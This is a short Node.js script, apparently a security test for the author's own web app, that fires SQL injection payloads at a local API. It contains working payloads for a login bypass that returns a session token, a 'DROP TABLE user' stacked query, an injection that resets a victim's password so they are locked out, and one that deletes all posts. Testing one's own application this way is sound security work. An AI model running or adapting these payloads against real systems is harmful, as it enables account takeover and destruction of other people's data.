//SCRIPT to attack with sql injection server sending dirty request
//To run, in folder "test", type -> node sql_injection.js

var axios = require('axios')

var token = '' //insert here valid token


//With this attack, i can access to an user account (i have to know victim email)
//Or i can access to random user (OR 1=1)
//If attack goes right, server return valid session token
myJSONObject = {'mail': "f@f.it' OR 1 LIMIT 1 -- -", "pwd": "a"}
axios.post('http://127.0.0.1:3001/api/user/auth', myJSONObject)
.then(response => {
    console.log("I get this valid session token [" + response.data.token + "]")
    token = response.data.token
})

//Add second query to manipolate data structure
//In this case, MySql connector doesn't support multiple queries in one transaction
//So return error
var data = {
    "mail": "z@s.it",
    "pwd": "as",
    "name": "Antonio",
    "surname": "Varoni",
    "country": "Italy'); DROP TABLE user; -- "
}
axios.post( 'http://127.0.0.1:3001/api/user/register', data)
.then( response => {
    if(response.status==200)
        console.log("Executed")
    })
.catch( error => {
    console.log(error.message)
})

//If we steal the token of another account (like over), with this attack we change the user's password to 123
//The new password is saved in db equal to '123' and so the it's not a diggest
//For the victim it will be impossible login into his account because the diggest will never
// be composed by only two characters
axios({
    method: 'put',
    url:  'http://127.0.0.1:3001/api/user/name',
    data: {
            "name": "fd', password = '123",
    },
    headers: { Authorization: `Bearer ${token}` }
    })
    .then((response) => {
        if(response.status==200)
            console.log('ok')

    })
    .catch((error) => {
        if(error) console.log(error.message)
    })


//With this request, a user can delete all posts of all users
axios({
    method: 'delete',
    url: 'http://127.0.0.1:3001/api/post',
    headers: { Authorization: `Bearer ${token}` },
    data: { post_id : "a' OR 1=1; -- -"}
})
.then((response) => {
    if(response.status==200)
        console.log('All posts have been deleted')
})
.catch((error) => {
    console.log(error.message)
})


